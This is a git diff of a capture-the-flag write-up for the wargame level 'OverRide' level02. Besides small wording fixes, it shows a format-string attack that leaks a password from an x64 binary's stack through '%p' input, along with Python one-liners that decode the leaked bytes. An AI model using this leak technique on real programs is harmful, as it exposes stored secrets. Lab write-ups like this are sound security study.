@@ -1,4 +1,4 @@
-# level 02
+# Level 02
 
 For the first time we have a x64 program that reads the password file and then check the user input against it to give a shell.
 
@@ -15,13 +15,13 @@ level02@OverRide:~$ ./level02
 rewrite it in 0x7fffffffe4d0 0 does not have access!
 ```
 
-Let's check what the value of our format string is in hex
+Let's check what the value of our format string is in hex:
 ```shell
 level02@OverRide:~$ python -c 'print "%p|".encode("hex")'
 25707c
 ```
 
-Let's now scan the memory to find it
+Let's now scan the memory to find it:
 ```shell
 level02@OverRide:~$ ./level02 < <(python -c 'print "%p|"*30')
 ===== [ Secure Access System v1.0 ] =====
@@ -35,16 +35,13 @@ level02@OverRide:~$ ./level02 < <(python -c 'print "%p|"*30')
 We can see that it's the 28th parameter to printf, more interesting looking at the position of the variables in the stack, the password buffer should come right before it.
 The trailing 0 confirms our suspicions.
 
-Let's convert these blocks to ascii, while keeping in mind to account for the endianness
+Let's convert these blocks to ascii, while keeping in mind to account for the endianness.
 ```
 756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d
 ```
 
 ```shell
-level02@OverRide:~$ python -c 'print "".join([i.decode("hex")[::-1] for i in "756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d".split("|")])'
-[censored]
-
 python -c 'import struct;print "".join([struct.pack("<Q", x) for x in [0x756e505234376848, 0x45414a3561733951, 0x377a7143574e6758, 0x354a35686e475873, 0x48336750664b394d]])'
-
+[redacted]
 ```
 Nice!
